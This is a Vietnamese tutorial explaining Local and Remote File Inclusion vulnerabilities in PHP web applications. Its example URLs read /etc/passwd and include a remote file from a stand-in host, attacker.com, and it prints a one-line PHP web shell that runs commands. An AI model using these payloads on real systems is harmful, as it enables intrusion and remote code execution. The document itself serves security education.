# File Inclusion
>Tên tài liệu: File Inclusion<br>
Thực hiện: Phạm Văn Tam <br>
Cập nhật lần cuối: 13/10/2024
>
# Mục Lục
[1. Khái niệm và các loại ](#p1) <br>
[2. Local File Inclusion (LFI)](#p2) <br>
[3. Remote File Inclusion (RFI)](#p3) <br>
[4. Lab ](#p4) <br>
# Nội dung
<a id="p1"></a>
## 1. Khái niệm và các loại
Inclusion là tính năng của ngôn ngữ lập trình giúp lập trình viên dễ dàng quản lý, tổ chức và tái sử dụng mã nguồn. <br>
File Inclusion là một lỗ hổng bảo mật trong ứng dụng web, xảy ra khi ứng dụng cho phép người dùng chỉ định tập tin (file) sẽ được nhúng vào hoặc thực thi bởi máy chủ. <br>
Có hai loại phổ biến: <br>
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI) <br>
Các hàm inclusion nhận tham số truyền vào là một đường dẫn tới File hoặc một URL tùy theo ngôn ngữ lập trình <br>
File Inclusion là biến thể của Path Traversal
<a id="p2"></a>
## 2. Local File Inclusion (LFI)
Local File Inclusion (LFI) là lỗ hổng cho phép kẻ tấn công đưa nội dung của một tập tin có sẵn trên máy chủ vào ứng dụng. Khi ứng dụng không kiểm tra kỹ đầu vào, hacker có thể lợi dụng để đọc các tập tin nhạy cảm như /etc/passwd trên hệ thống Linux, hoặc các file cấu hình chứa thông tin quan trọng. <br>
Kịch bản phổ biến là ứng dụng dùng hàm include, require, include_once hoặc require_once trong PHP để nhúng file theo đường dẫn mà người dùng cung cấp. Nếu không xử lý đầu vào cẩn thận, hacker có thể thay đổi đường dẫn này để truy cập tập tin nhạy cảm. <br>
Ví dụ: <br>
URL sau: <br>
```
http://testphp.com/index.php?page=about.php
```
Nếu không kiểm tra kỹ đầu vào page, hacker có thể chỉnh sửa URL để: <br>
```
http://testphp.com/index.php?page=/etc/passwd
```
<a id="p3"></a>
## 3. Remote File Inclusion (RFI)
Remote File Inclusion (RFI) là lỗ hổng cho phép hacker nhúng và thực thi một tập tin từ một máy chủ khác. Điều này có thể dẫn đến việc thực thi mã độc hại trên máy chủ đích. RFI nguy hiểm hơn LFI vì nó cho phép hacker đưa mã độc vào từ xa và có thể chiếm quyền điều khiển máy chủ. <br>
Lỗ hổng này thường xảy ra khi ứng dụng web chấp nhận URL từ xa làm tham số và sử dụng hàm `include` hoặc `require` mà không kiểm tra kỹ đầu vào. <br>
Ví dụ : <br>
URL sau : <br>
```
http://testphp.com/index.php?page=http://attacker.com/shell.php
```
Tệp shell.php có nội dung : `<?php system($_GET['cmd']); ?>` <br>
Từ đó tệp shell.php sẽ được tải về và thực thi trên server. <br>
Lưu ý: RFI sẽ không hoạt động nếu có prefix đứng trước tham số URL
```
<?php
$page = $_GET["page"];
include("module/".$page);
echo $content;
?>
```
Thì module/http://attacker.com/shell.php sẽ không hoạt động <br>
<a id="p4"></a>
## 4. Lab

